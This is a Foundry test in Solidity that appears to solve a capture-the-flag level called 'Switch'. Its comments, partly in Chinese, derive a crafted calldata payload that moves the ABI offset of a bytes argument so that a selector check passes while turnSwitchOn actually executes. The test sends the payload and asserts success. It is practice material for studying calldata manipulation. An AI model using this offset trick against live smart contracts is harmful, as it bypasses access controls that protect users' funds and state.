// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Switch} from "../src/Switch.sol";

/*  
cast sig "turnSwitchOn()" 0x76227e12
cast sig "turnSwitchOff()" 0x20606e15
cast sig "flipSwitch(bytes memory)" 0x30c13ade
*/

/*  
cast calldata "flipSwitch(bytes)" 0x20606e15
0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000

0x30c13ade
0000000000000000000000000000000000000000000000000000000000000020 // offset of bytes  
0000000000000000000000000000000000000000000000000000000000000004 // bytes' length
20606e1500000000000000000000000000000000000000000000000000000000 // bytes contents

目标选择器的位置
4 + 32 + 32 = 68
// 目标位置必须为 - 20606e15

改变偏移量来获取真正的calldata
0x30c13ade
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000000
20606e1500000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000004
76227e1200000000000000000000000000000000000000000000000000000000

30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000

执行代码的位置
32 * 3 = 96 (0x60)
*/

contract PrivacyTest is Test {
    Switch public stc;

    function setUp() public {
        stc = new Switch();
    }

    function testAttack() public {
        bytes
            memory _data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool ok, ) = address(stc).call(_data);
        require(ok);

        assertEq(stc.switchOn(), true);
    }
}
